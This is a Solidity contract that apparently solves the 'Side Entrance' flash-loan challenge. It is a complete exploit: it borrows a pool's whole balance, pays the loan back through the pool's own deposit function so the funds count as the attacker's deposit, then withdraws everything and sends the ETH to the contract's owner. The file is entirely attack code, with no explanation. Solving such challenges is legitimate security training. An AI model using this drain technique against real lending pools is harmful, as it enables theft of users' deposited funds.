// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "solady/src/utils/SafeTransferLib.sol";

interface IPool {
    function flashLoan(uint256 amount) external;
    function deposit() external payable;
    function withdraw() external;
}

contract ExploiterSideEntranceLender {
    IPool public immutable pool;
    address public immutable owner;

    constructor(IPool _pool) {
        owner = msg.sender;
        pool = _pool;
    }

    function attack() external {
        uint256 poolBalance = address(pool).balance;
        pool.flashLoan(poolBalance);
    }

    function execute() external payable {
        pool.deposit{value: msg.value}();
    }

    function withdraw() external payable {
        pool.withdraw();
        SafeTransferLib.safeTransferETH(owner, address(this).balance);
    }

    receive() external payable {}
}
